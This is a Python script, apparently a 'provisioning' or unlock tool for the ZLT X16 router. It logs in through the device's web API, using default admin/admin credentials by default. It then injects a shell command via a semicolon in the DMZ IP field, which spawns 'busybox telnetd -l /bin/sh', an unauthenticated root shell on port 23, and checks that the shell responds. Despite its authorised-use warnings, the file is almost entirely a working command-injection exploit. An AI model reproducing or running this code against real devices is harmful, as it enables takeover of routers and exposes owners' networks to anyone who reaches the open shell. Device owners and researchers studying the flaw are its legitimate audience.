#!/usr/bin/env python3
"""
zltx16_unlock.py - reference implementation of the ZLT X16 provisioning flow.

This is the single-file Python twin of the Go CLI. It talks to the device's own
web management API; the protocol was reverse engineered from the firmware's
served JavaScript (/tzwww/js/login.js, /tzwww/js/main.js).

Login:   cmd=232 returns a token, then cmd=100 with passwd=sha256(token+password)
Inject:  cmd=172 subcmd=6 (network service / DMZ). The "ip" field is interpolated
         into a root shell command, so ';' starts an extra command.

AUTHORISED USE ONLY. Only run this against ZLT X16 units you own or have written
permission to administer. It changes device state and opens an unauthenticated
root shell on tcp/23.

Usage:
    ./zltx16_unlock.py probe    -H 192.168.3.1
    ./zltx16_unlock.py login    -H 192.168.3.1 -u admin -p admin
    ./zltx16_unlock.py verify   -H 192.168.3.1 --ports 23,22
    ./zltx16_unlock.py unlock   -H 192.168.3.1 -u admin -p admin --confirm
    ./zltx16_unlock.py unlock   -H 192.168.3.1 -u superadmin -p "$SUPER_PWD" \
                                --dmz 127.0.0.1 --mode telnet --confirm

Requires: Python 3.8+, standard library only.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import socket
import ssl
import sys
import time
import urllib.error
import urllib.request

CGI = "/cgi-bin/http.cgi"

# RequestCmd values from the device's main.js
CMD_INIT_PAGE = 80
CMD_LOGIN = 100
CMD_LOGOUT = 101
CMD_DEVICE_INFO = 207
CMD_NETWORK_SERVICE = 172
CMD_GET_NEXT_LOGIN_TIME = 232

DMZ_SUBCMD = 6

DEFAULT_USER = "admin"
DEFAULT_PASS = "admin"

# The field must be a bare IPv4 address; the injection is appended deliberately
# and only after this check, so hostile input can never reach the URL.
_IPV4 = re.compile(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$")


def _valid_ipv4(value: str) -> bool:
    m = _IPV4.match(value or "")
    if not m:
        return False
    return all(0 <= int(part) <= 255 for part in m.groups())


def hash_password(token: str, password: str) -> str:
    """Reproduce the browser transform: sha256_hex(token + password)."""
    return hashlib.sha256((token + password).encode("utf-8")).hexdigest()


class Device:
    def __init__(self, host: str, port: int = 80, scheme: str = "http",
                 timeout: float = 8.0, verify_tls: bool = False):
        self.host = host
        self.port = port
        self.scheme = scheme
        self.timeout = timeout
        self.session_id = ""
        self.level = ""
        self._opener = self._build_opener(verify_tls)

    @property
    def base(self) -> str:
        if (self.scheme == "http" and self.port == 80) or \
           (self.scheme == "https" and self.port == 443):
            return f"{self.scheme}://{self.host}"
        return f"{self.scheme}://{self.host}:{self.port}"

    def _build_opener(self, verify_tls: bool):
        ctx = ssl.create_default_context()
        if not verify_tls:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))

    def _post_json(self, cmd: int, method: str, body: dict) -> str:
        url = (f"{self.base}{CGI}?cmd={cmd}&method={method}"
               f"&sessionId={self.session_id}&language=en")
        data = json.dumps(body).encode("utf-8")
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("X-Requested-With", "XMLHttpRequest")
        req.add_header("Referer", f"{self.base}/login.html")
        with self._opener.open(req, timeout=self.timeout) as resp:
            return resp.read().decode("utf-8", "replace")

    def fetch_token(self) -> str:
        body = {"cmd": CMD_GET_NEXT_LOGIN_TIME, "method": "GET", "sessionId": ""}
        raw = self._post_json(CMD_GET_NEXT_LOGIN_TIME, "GET", body)
        if not raw.strip():
            raise RuntimeError("token step returned an empty body")
        return json.loads(raw).get("token", "")

    def login(self, username: str, password: str) -> dict:
        token = self.fetch_token()
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest() * 1
        body = {
            "cmd": CMD_LOGIN,
            "method": "POST",
            "sessionId": self.session_id,
            "username": username,
            "passwd": hash_password(token, password),
            "isAutoUpgrade": "0",
        }
        raw = self._post_json(CMD_LOGIN, "POST", body)
        if not raw.strip():
            raise RuntimeError("login returned an empty body")
        res = json.loads(raw)
        if res.get("sessionId"):
            self.session_id = res["sessionId"]
        self.level = str(res.get("user_level") or res.get("account_level") or "")
        return res

    def network_service(self, payload: dict) -> str:
        return self._post_json(CMD_NETWORK_SERVICE, "POST", payload)


def dmz_payload(session_id: str, dmz_host: str, command: str) -> dict:
    if not _valid_ipv4(dmz_host):
        raise ValueError(f"dmz host {dmz_host!r} must be a bare IPv4 address")
    if not command.strip():
        raise ValueError("command must not be empty")
    if "\n" in command or "\r" in command:
        raise ValueError("command must be a single line")
    return {
        "cmd": CMD_NETWORK_SERVICE,
        "method": "POST",
        "subcmd": DMZ_SUBCMD,
        "sessionId": session_id,
        "enabled": "1",
        "ip": f"{dmz_host};{command}",
    }


def telnet_command(port: int = 23) -> str:
    if not (0 < port <= 65535):
        port = 23
    return f"busybox telnetd -l /bin/sh -p {port}"


def probe_shell(host: str, port: int, timeout: float = 3.0) -> dict:
    """Connect and decide whether an unauthenticated shell is answering."""
    out = {"port": port, "open": False, "no_auth": False,
           "banner": "", "error": None}
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            out["open"] = True
            s.settimeout(timeout)
            try:
                data = s.recv(512)
            except socket.timeout:
                out["no_auth"] = True   # silent listener, no login handler
                return out
            out["banner"] = data.decode("utf-8", "replace")
            clean = "".join(ch for ch in out["banner"].lower()
                            if ch >= " " or ch in "\r\n\t")
            if any(p in clean for p in ("login:", "username:", "password:")):
                out["no_auth"] = False
            elif "/ #" in clean or "# " in clean or "$ " in clean:
                out["no_auth"] = True
            else:
                out["no_auth"] = True
    except OSError as exc:
        out["error"] = str(exc)
    return out


# --------------------------------------------------------------------------- #
# commands
# --------------------------------------------------------------------------- #

def cmd_probe(args) -> int:
    dev = Device(args.host, args.port, args.scheme, args.timeout)
    print(f"target {args.host}")
    for p in (80, 443, 8080, 22, 23):
        s = socket.socket()
        s.settimeout(args.timeout)
        try:
            s.connect((args.host, p))
            print(f"  port {p:<5} open")
        except OSError:
            print(f"  port {p:<5} closed")
        finally:
            s.close()
    try:
        raw = dev._post_json(CMD_INIT_PAGE, "GET",
                             {"cmd": CMD_INIT_PAGE, "method": "GET"})
        info = json.loads(raw)
        for k in ("aeraId", "device_name", "build_type", "current_version"):
            if k in info:
                print(f"  {k:<14} {info[k]}")
    except Exception as exc:            # noqa: BLE001 - diagnostic only
        print(f"  init page unavailable: {exc}")
    return 0


def cmd_login(args) -> int:
    dev = Device(args.host, args.port, args.scheme, args.timeout)
    try:
        res = dev.login(args.user, args.passwd)
    except Exception as exc:            # noqa: BLE001
        print(f"login error: {exc}")
        return 1
    ok = res.get("AUTH") == "AUTH" or res.get("success") == "success"
    if ok:
        print(f"login OK  user={args.user} level={dev.level} session={dev.session_id}")
        return 0
    print(f"login FAILED  message={res.get('message')!r} success={res.get('success')!r}")
    return 1


def cmd_verify(args) -> int:
    ports = [int(p) for p in args.ports.split(",") if p.strip().isdigit()]
    found = False
    for port in ports:
        st = probe_shell(args.host, port, args.timeout)
        if st["open"] and st["no_auth"]:
            print(f"  port {port}: OPEN, no authentication "
                  f"(banner={st['banner'].strip()[:60]!r})")
            found = True
        elif st["open"]:
            print(f"  port {port}: open (login handler present)")
        else:
            print(f"  port {port}: closed")
    print("result:", "a passwordless shell is exposed" if found
          else "no passwordless shell detected")
    return 0 if found else 1


def cmd_unlock(args) -> int:
    if not args.confirm:
        print("refusing to modify a device without --confirm.\n"
              "This tool changes device state and opens an unauthenticated root\n"
              "shell. Only run it against equipment you own or have written\n"
              "permission to administer.", file=sys.stderr)
        return 2

    dev = Device(args.host, args.port, args.scheme, args.timeout)
    try:
        res = dev.login(args.user, args.passwd)
    except Exception as exc:            # noqa: BLE001
        print(f"login error: {exc}", file=sys.stderr)
        return 1
    if not (res.get("AUTH") == "AUTH" or res.get("success") == "success"):
        print(f"login rejected: {res}", file=sys.stderr)
        return 1
    print(f"login            OK (level {dev.level})")

    if args.mode == "command":
        if not args.cmd:
            print("-mode=command requires --cmd", file=sys.stderr)
            return 2
        command = args.cmd
    else:
        command = telnet_command(args.dport)

    try:
        payload = dmz_payload(dev.session_id, args.dmz, command)
    except ValueError as exc:
        print(f"payload error: {exc}", file=sys.stderr)
        return 2

    print(f"payload          {json.dumps(payload)}")
    reply = ""
    try:
        reply = dev.network_service(payload)
        if reply.strip():
            print(f"device replied   {reply.strip()[:200]}")
        if "NO_AUTH" in reply:
            print("device rejected the session (NO_AUTH)", file=sys.stderr)
            return 1
    except Exception as exc:            # noqa: BLE001
        # The device often closes the connection while spawning the daemon.
        print(f"note             request did not return cleanly: {exc}")

    time.sleep(2)
    port = args.dport if args.mode != "command" else 23
    st = probe_shell(args.host, port, args.timeout)
    if st["open"] and st["no_auth"]:
        print(f"verify           port {port}: OPEN, no authentication")
        print("result           ROOT SHELL AVAILABLE (no authentication)")
        return 0
    if st["open"]:
        print(f"verify           port {port}: open, but a login handler answered")
    else:
        print(f"verify           port {port}: closed")
    print("result           injection sent but no shell observed")
    return 1


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="ZLT X16 provisioning toolkit (authorised use only)")
    sub = p.add_subparsers(dest="command", required=True)

    def common(sp):
        sp.add_argument("-H", "--host", default="192.168.3.1", help="device address")
        sp.add_argument("--port", type=int, default=80, help="management port")
        sp.add_argument("--scheme", default="http", choices=("http", "https"))
        sp.add_argument("--timeout", type=float, default=8.0)
        sp.add_argument("-u", "--user", default=DEFAULT_USER)
        sp.add_argument("-p", "--passwd", default=DEFAULT_PASS)

    common(sub.add_parser("probe", help="reachability and version"))
    common(sub.add_parser("login", help="verify credentials"))
    sv = sub.add_parser("verify", help="check for an existing passwordless shell")
    common(sv)
    sv.add_argument("--ports", default="23,22")

    su = sub.add_parser("unlock", help="install a passwordless root shell")
    common(su)
    su.add_argument("--mode", default="telnet",
                    choices=("telnet", "telnet-alt", "command"))
    su.add_argument("--dport", type=int, default=23)
    su.add_argument("--dmz", default="127.0.0.1")
    su.add_argument("--cmd", default="")
    su.add_argument("--confirm", action="store_true",
                    help="acknowledge you are authorised to modify this device")
    return p


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    handlers = {
        "probe": cmd_probe,
        "login": cmd_login,
        "verify": cmd_verify,
        "unlock": cmd_unlock,
    }
    try:
        return handlers[args.command](args)
    except KeyboardInterrupt:
        return 130
    except urllib.error.URLError as exc:
        print(f"network error: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
